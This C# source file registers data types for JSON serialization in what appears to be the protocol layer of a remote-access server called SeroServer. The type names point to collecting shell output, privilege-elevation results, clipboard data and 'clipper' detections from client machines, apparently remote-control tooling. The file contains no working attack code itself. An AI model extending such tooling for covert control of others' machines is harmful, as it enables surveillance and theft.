using System.Text.Json.Serialization;
using SeroServer.Net;

namespace SeroServer.Protocol;

[JsonSerializable(typeof(ClientInfoData))]
[JsonSerializable(typeof(HardwareStatsData))]
[JsonSerializable(typeof(ShellOutputData))]
[JsonSerializable(typeof(ElevationResultData))]
[JsonSerializable(typeof(RdpClipboardData))]
[JsonSerializable(typeof(ClipperDetectedData))]
[JsonSerializable(typeof(WindowNotifyAlertData))]
[JsonSerializable(typeof(IpApiResponse))]
internal sealed partial class ServerJsonContext : JsonSerializerContext { }
